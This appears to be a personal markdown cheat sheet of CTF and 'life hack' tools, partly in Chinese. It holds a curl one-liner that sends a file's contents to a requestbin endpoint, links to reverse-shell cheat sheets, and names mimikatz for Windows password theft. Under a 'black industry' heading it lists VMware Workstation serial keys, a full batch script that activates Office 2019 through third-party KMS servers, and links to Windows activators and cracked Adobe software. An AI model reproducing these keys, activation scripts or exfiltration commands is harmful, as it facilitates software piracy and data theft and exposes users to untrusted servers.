# Tools

## CTF-Tools

* [CyberShef](https://gchq.github.io/CyberChef/#input=8J%2BNo/CfjbTwn42m8J%2BMtPCfjaLwn4278J%2BNs/CfjbTwn42l8J%2BNp/CfjaHwn42u8J%2BMsPCfjafwn42y8J%2BNofCfjbDwn42o8J%2BNufCfjZ/wn42i8J%2BNufCfjZ/wn42l8J%2BNrfCfjLDwn4yw8J%2BMsPCfjLDwn4yw8J%2BMsPCfjarwn42p8J%2BNvQo)

### Rev-Shell
* [Reverse-Shell大全](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 
* [GitHub-List-Rev](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
### Crypto
* https://blog.csdn.net/qq_38780085/article/details/79305488
* [BrainFuck](https://gist.github.com/maxcountryman/1699708)

## 生活駭客

* [word放code](http://www.planetb.ca/projects/syntaxHighlighter)
* [手機連電腦-apowerviewer](https://www.google.com/search?q=apowermirror&oq=apowermirror&aqs=chrome..69i57j0l7.5587j0j7&sourceid=chrome&ie=UTF-8)
* [Bash-Command-Search](https://ss64.com/)
* [7z-CLI-用法](https://www.cnblogs.com/sparkdev/p/5598062.html)
    ```bash=
    7z.exe a <target> <source: 只能用相對路徑>
    ```
* [PCHunter Tool](https://www.bleepingcomputer.com/download/pc-hunter/)
    * Windows系統訊息查看，輔助殺毒文件
* Python HTTP Server
    ```python=
    python -m http.server 8080
    ```
* curl 配 request-bin 傳檔
    ```
    (echo -n '{"payload": "'; <file>; echo '"}') | curl -H "Content-Type: application/json" -d @- <requests-bin url>
    ```
* Command-Injection
    - https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E5%8F%8D%E5%BC%95%E5%8F%B7%EF%BC%88%E9%87%8D%E9%9F%B3%E7%AC%A6%EF%BC%89


## Windows Tricks
* windows監控遠端task跟service
    - `sc` `tasklist`
    - https://www.raymond.cc/blog/remotely-start-and-stop-applications-or-services-over-the-internet/
* [送windows通知](http://vaskovsky.net/notify-send/)

## Hacking Trick

### win10系統密碼hack
* netpass
* mimikatz

### MD5
* somd5.com
* cmd5.com


## Proxy 

* Windows CLI Set-Proxy
```
set http_proxy=socks5://<ip>:<port>
```

## Paid Software Download

* [免費Java - OpenJDK download](https://adoptopenjdk.net/)

* [Patch My PC](https://patchmypc.com/home-updater)

## 黑產

### VMware 16 pro

:::warning
記得選Pro，不要用Player，Player功能很少
> https://www.vmware.com/tw/products/workstation-pro/faq.html
:::
* Serial-key 
    * [Link](https://gist.github.com/gopalindians/ec3f3076f185b98353f514b26ed76507)
```
Serial keys:

ZF3R0-FHED2-M80TY-8QYGC-NPKYF
YF390-0HF8P-M81RQ-2DXQE-M2UT6
ZF71R-DMX85-08DQY-8YMNC-PPHV8
AZ3E8-DCD8J-0842Z-N6NZE-XPKYF
FC11K-00DE0-0800Z-04Z5E-MC8T6

If the keys worked for you, this(https://isha.sadhguru.org/mahashivratri/sadhguru/articles/shambho-a-gentle-form-of-shiva/) will also work.
```

* 載點
    * https://www.vmware.com/products/workstation-pro.html


### MicroSoft Activating Script 

* https://github.com/massgravel/Microsoft-Activation-Scripts

### Office2019-啟用script
* https://gist.github.com/frodoslaw/863cd7207f0736b075d9c5e6604f614e
```bat=
@echo off
title Activate Microsoft Office 2019 ALL versions for FREE!&cls&echo ============================================================================&echo #Project: Activating Microsoft software products for FREE without software&echo ============================================================================&echo.&echo #Supported products:&echo - Microsoft Office Standard 2019&echo - Microsoft Office Professional Plus 2019&echo.&echo.&(if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16")&(if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16")&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)&echo.&echo ============================================================================&echo Activating your Office...&cscript //nologo slmgr.vbs /ckms >nul&cscript //nologo ospp.vbs /setprt:1688 >nul&cscript //nologo ospp.vbs /unpkey:6MWKP >nul&cscript //nologo ospp.vbs /inpkey:NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP >nul&set i=1
:server
if %i%==1 set KMS_Sev=kms7.MSGuides.com
if %i%==2 set KMS_Sev=kms8.MSGuides.com
if %i%==3 set KMS_Sev=kms9.MSGuides.com
if %i%==4 goto notsupported
cscript //nologo ospp.vbs /sethst:%KMS_Sev% >nul&echo ============================================================================&echo.&echo.
cscript //nologo ospp.vbs /act | find /i "successful" && (echo.&echo ============================================================================&echo.&echo #My official blog: MSGuides.com&echo.&echo #How it works: bit.ly/kms-server&echo.&echo #Please feel free to contact me at msguides.com@gmail.com if you have any questions or concerns.&echo.&echo #Please consider supporting this project: donate.msguides.com&echo #Your support is helping me keep my servers running everyday!&echo.&echo ============================================================================&choice /n /c YN /m "Would you like to visit my blog [Y,N]?" & if errorlevel 2 exit) || (echo The connection to my KMS server failed! Trying to connect to another one... & echo Please wait... & echo. & echo. & set /a i+=1 & goto server)
explorer "http://MSGuides.com"&goto halt
:notsupported
echo.&echo ============================================================================&echo Sorry! Your version is not supported.&echo Please try installing the latest version here: bit.ly/aiomsp
:halt
pause >nul
```

### Adobe黑產

* 2019-2020(別下到2021)
    * https://lazymandaily.com/adobe-2019-2020-full-packet-crack/

## 黑市
- https://hackerwarehouse.com/